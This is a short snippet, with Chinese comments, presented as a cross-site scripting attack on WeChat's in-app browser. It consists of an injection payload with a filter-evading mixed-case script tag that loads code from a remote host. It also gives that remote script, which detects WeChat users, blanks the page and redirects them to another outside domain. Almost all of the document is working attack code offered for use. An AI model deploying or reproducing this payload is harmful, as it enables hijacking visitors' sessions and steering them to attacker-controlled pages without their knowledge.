//以下是用于在微信内置浏览器中进行跨站脚本攻击(XSS)
//用于注入的代码
<body hidden></body><scRipT src=//loads.applinzi.com/json.php?id=jump></ScripT><noscript>

//src所指向的文件的内容
var ua = navigator.userAgent;if(ua.indexOf("MicroMessenger")>0){document.getElementsByTagName("body")[0].outerHTML="<center>Loading...</center>";window.location.href = "http://sud04.chinacloudapp.cn/app.html?rand=6131488121308&id=1243";}
